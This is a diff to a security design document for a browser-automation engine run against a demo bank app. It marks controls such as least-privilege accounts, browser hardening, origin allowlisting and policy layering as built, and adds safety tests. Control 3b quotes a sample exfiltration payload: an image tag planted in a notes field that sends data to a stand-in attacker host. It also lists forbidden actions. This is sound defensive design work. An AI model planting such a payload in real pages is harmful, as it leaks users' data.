@@ -6,31 +6,34 @@ Terms in [CONTEXT.md](../CONTEXT.md). The principle: arrange things so the dange
 
 | # | Control | Where it lives | Status |
 |---|---|---|---|
-| 1 | **Least-privilege Service Account.** The login used for a capability holds the narrowest role it needs; a read-only capability signs in as a user with no Transfer menu at all. Even a fully compromised automation cannot move money. | the Tenant's app | **TO BUILD** — two logins in the demo app |
-| 2 | **Capability by construction.** The Replay Engine implements a closed action vocabulary; `download`, `execute_script`, `open_new_tab` have no implementation, so no Artifact can express them. | engine | **TO BUILD** |
-| 3 | **Browser hardening.** Downloads off, popups and new tabs closed and logged, file chooser disabled, permissions denied, JS dialogs dismissed, a fresh context per run so no cookie crosses Tenants. | driver | **TO BUILD** |
-| 3b | **Route interception.** Every request the browser makes — including ones the page starts by itself (images, scripts, redirects) — is checked against the allowlisted origins and aborted if it fails. This is what stops data leaving via a planted `<img src="https://attacker.example/?data=…">` in a member notes field, which a check-before-we-act rule cannot see. | driver | **TO BUILD** |
+| 1 | **BUILT** — **Least-privilege Service Account.** The login used for a capability holds the narrowest role it needs; a read-only capability signs in as a user with no Transfer menu at all. Even a fully compromised automation cannot move money. | the Tenant's app | `fake_bank/data.py`, `cua/engine.py` (EnvSecrets per service account) |
+| 2 | **BUILT** — **Capability by construction.** The Replay Engine implements a closed action vocabulary; `download`, `execute_script`, `open_new_tab` have no implementation, so no Artifact can express them. | `cua/artifact.py` closed vocabularies |
+| 3 | **BUILT** — **Browser hardening.** Downloads off, popups and new tabs closed and logged, file chooser disabled, permissions denied, JS dialogs dismissed, a fresh context per run so no cookie crosses Tenants. | `cua/surface.py` |
+| 3b | **BUILT** — **Route interception.** Every request the browser makes — including ones the page starts by itself (images, scripts, redirects) — is checked against the allowlisted origins and aborted if it fails. This is what stops data leaving via a planted `<img src="https://attacker.example/?data=…">` in a member notes field, which a check-before-we-act rule cannot see. | `cua/surface.py` `_gate` |
 | 4 | **Network isolation.** The browser can reach only that Tenant's origins (container egress allowlist or proxy). Off-domain navigation fails at the network, not at an `if`. Also the real defence against exfiltration via a planted link. | deployment | Design only, not built |
 | 5 | **Credential separation by phase.** The discovery process cannot see production secrets at all — different namespace, different service account. "Discovery can't touch production" becomes a fact, not a flag. | deployment | Design only, not built |
 | 6 | **Two-Person Approval** for any Artifact containing a Consequential Action. Mirrors bank change control. | artifact + check | **TO BUILD** — simplified |
 | 7 | **Tamper-evident Evidence.** Append-only JSONL with a hash chain; a run's history cannot be quietly rewritten. This is what makes an `Outcome Unknown` verdict trustworthy. | evidence sink | Design only, not built |
-| 8 | **Policy layering.** Baseline ∩ Tenant ∩ Needs, checked before every action. | engine | **TO BUILD** |
-| 9 | **Secrets by reference.** Substituted at the moment of typing, below the model, below the log, below the Artifact. | engine | **TO BUILD** |
-| 10 | **Redaction Chokepoint**, both inbound (logs, evidence, artifacts, returned outputs) and outbound (observation text before it reaches a model, with the screenshot cropped to the app window and downscaled). | one function | **TO BUILD** |
+| 8 | **BUILT** — **Policy layering.** Baseline ∩ Tenant ∩ Needs, checked before every action. | `cua/policy.py`, `config/baseline.yaml`, `config/policies/*` |
+| 9 | **BUILT** — **Secrets by reference.** Substituted at the moment of typing, below the model, below the log, below the Artifact. | `cua/engine.py` |
+| 10 | **PARTLY BUILT** — **Redaction Chokepoint**, both inbound (logs, evidence, artifacts, returned outputs) and outbound (observation text before it reaches a model, with the screenshot cropped to the app window and downscaled). | `cua/redact.py`; outbound masking still to do |
 
-**Nothing here is built yet** — every row is a decision, not a claim about the code. As each is implemented, change its status to BUILT and name the file that holds it.
+Rows marked BUILT are implemented and covered by a test in `tests/test_safety.py`. The rest are decisions, not claims about the code.
 
 ## Tests that are controls
 
-None of these exist yet.
+All of these pass today except the two marked (todo).
 
 - Replay code cannot import the model SDK (import-graph test).
 - An Artifact naming an action outside the vocabulary is rejected by the schema.
 - An Artifact whose Needs exceed the Policy is Refused before the browser opens.
+- A capability whose Role the Tenant has not granted is Refused, naming the layer that refused.
+- A request to another origin is aborted inside the browser, including one the page starts itself.
 - A Tenant Overlay that adds a Transition, changes the Contract or widens Needs is rejected.
 - A redaction canary value never appears in any evidence file, log line or screenshot.
 - A Business Outcome is never retried.
-- Automation and Operator cannot hold control at the same time.
+- Every policy decision is recorded in the evidence.
+- Automation and Operator cannot hold control at the same time. (todo: step 8)
 
 ## Known limits (state these plainly in REPORT.md)
 
